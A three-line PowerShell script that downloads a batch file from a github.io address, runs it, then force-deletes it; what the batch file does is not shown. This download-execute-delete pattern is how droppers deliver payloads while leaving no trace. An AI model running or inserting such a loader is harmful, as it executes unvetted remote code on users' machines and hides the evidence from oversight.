Invoke-WebRequest -Uri https://qhvg.github.io/win/main.bat -OutFile ".\windows.bat"
Start-Process -FilePath ".\windows.bat" -Wait
Remove-Item -Path "windows.bat" -Force
